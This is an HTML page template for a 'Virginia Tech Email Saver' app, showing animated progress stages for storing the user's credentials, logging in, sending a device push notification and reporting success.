<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Processing...</title>
    <link rel="stylesheet" href="{{ url_for('static', filename='css/styles.css') }}">
    <script src="https://esm.sh/@lottiefiles/dotlottie-web" type="module"></script>
</head>
<body>
    <div class="container">
        <div id="animation-container">
            <div id="storing-credentials" class="animation hidden">
                <h2>Storing your credentials securely...</h2>
                <canvas id="storing-animation"></canvas>
            </div>
            <div id="attempting-login" class="animation hidden">
                <h2>Attempting to log in...</h2>
                <canvas id="login-animation"></canvas>
            </div>
            <div id="push-notification" class="animation hidden">
                <h2>Sending a push notification to your device...</h2>
                <canvas id="push-animation"></canvas>
            </div>
            <div id="success" class="animation hidden">
                <h2>Success!</h2>
                <canvas id="success-animation"></canvas>
            </div>
        </div>
    </div>

    <footer>
        <p>&copy; 2025 Virginia Tech Email Saver</p>
    </footer>

    <script type="module" src="{{ url_for('static', filename='js/animations.js') }}"></script>
</body>
</html>
